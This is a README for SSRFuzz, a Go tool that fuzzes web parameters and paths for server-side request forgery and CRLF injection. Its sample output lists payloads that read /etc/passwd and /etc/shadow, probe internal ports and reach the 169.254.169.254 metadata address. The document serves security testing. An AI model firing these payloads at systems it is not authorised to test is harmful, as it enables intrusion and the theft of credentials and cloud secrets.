# SSRFUZZ

SSRFuzz is a tool to find Server Side Request Forgery vulnerabilities, with CRLF chaining capabilities

## Why?
- I wanted to write a tool in Golang for concurrency
- I wanted to fuzz parameters for SSRF vulnerablities, as well as fuzz _both_ paths and parameters for CRLF injections
- I was inspired by Orange's work for chaining these types of vulnerabilities together (https://blog.orange.tw)

## Installation

Run the following command to intsall

```bash
go get -u github.com/ryandamour/ssrfuzz
```

## Usage

```go

  ██████   ██████  ██▀███    █████▒█    ██ ▒███████▒▒███████▒
▒██    ▒ ▒██    ▒ ▓██ ▒ ██▒▓██   ▒ ██  ▓██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░
░ ▓██▄   ░ ▓██▄   ▓██ ░▄█ ▒▒████ ░▓██  ▒██░░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ 
  ▒   ██▒  ▒   ██▒▒██▀▀█▄  ░▓█▒  ░▓▓█  ░██░  ▄▀▒   ░  ▄▀▒   ░
▒██████▒▒▒██████▒▒░██▓ ▒██▒░▒█░   ▒▒█████▓ ▒███████▒▒███████▒
▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░ ▒ ░   ░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒
░ ░▒  ░ ░░ ░▒  ░ ░  ░▒ ░ ▒░ ░     ░░▒░ ░ ░ ░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒
░  ░  ░  ░  ░  ░    ░░   ░  ░ ░    ░░░ ░ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ░
      ░        ░     ░               ░       ░ ░      ░ ░    
                                           ░        ░        

===============================================================
SSRFUZZ 1.2
by Ryan D'Amour @ryandamour 
===============================================================A scanner for all your SSRF Fuzzing needs

Usage:
  ssrfuzz scan [flags]

Flags:
  -c, --cookie string          Cookie to use for requests
      --crlf-path              Add CRLF payloads to all available paths (ie: site.com/%0Atest.php)
      --delay int              The time each threads waits between requests in milliseconds (default 100)
  -d, --domains string         Location of domains with parameters to scan
  -h, --help                   help for scan
  -x, --http-method string     HTTP Method - GET or POST (default "GET")
  -o, --output string          Location to save results
      --skip-crlf              Skip CRLF fuzzing
      --skip-network           Skip network fuzzing
      --skip-scheme            Skip scheme fuzzing
  -s, --slack-webhook string   Slack webhook to send findings to a channel
  -t, --threads int            Number of threads to run ssrfuzz on (default 50)
      --timeout int            The amount of time needed to close a connection that could be hung (default 10)
  -u, --user-agent string      User agent for requests (default "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36")
  -v, --verbose                verbose output
```

```bash
Usage: 
echo "http://url_to_fuzz" | ssrfuzz scan
cat file_of_domains.txt | ssrfuzz scan
ssrfuzz scan -d file_of_domains.txt
```

```go
* Scanning http and scheme payloads w/ crlf:

echo "http://192.168.1.10/test.php?u=" | go run main.go scan
 
[!] Scheme payload match:
* http://192.168.1.10/test.php?u=file://etc/passwd 200

[!] Interesting payloads found
* http://192.168.1.10/test.php?u=http://127.1.0.0:80 200
* http://192.168.1.10/test.php?u=http://127.1.0.0:8080 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:443 500
* http://192.168.1.10test.php?u=http://127.1.0.0:22 500
* http://192.168.1.10/test.ph?u=http://127.1.0.0:25 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:445 500

[!] Interesting payloads found
* http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
* http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
* http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
```

```go
* Scanning only http payloads w/ crlf:

echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme

[!] Interesting payloads found
* http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
* http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
* http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:443%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:443%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:25%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:25%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:22%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:22%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:445%23%OA 500
* http://192.168.1.10/test.php?u=http://127.127.127.127:445%23%OA 500
```

```go
* Scanning only http payloads w/o crlf:

echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme --skip-crlf

[!] Interesting payloads found
* http://192.168.1.10/test.php?u=http://127.1.0.0:80 200
* http://192.168.1.10/test.php?u=http://127.1.0.0:8080 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:443 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:22 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:25 500
* http://192.168.1.10/test.php?u=http://127.1.0.0:445 500
```

```go
* Scanning only scheme payloads w/o crlf:

echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-network --skip-crlf

[!] Interesting payloads found
* http://192.168.1.10/test.php?u=file:///etc/passwd 200
* http://192.168.1.10/test.php?u=file:///etc/shadow 500
* http://192.168.1.10/test.php?u=file://169.254.169.254/ 500
```


## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)

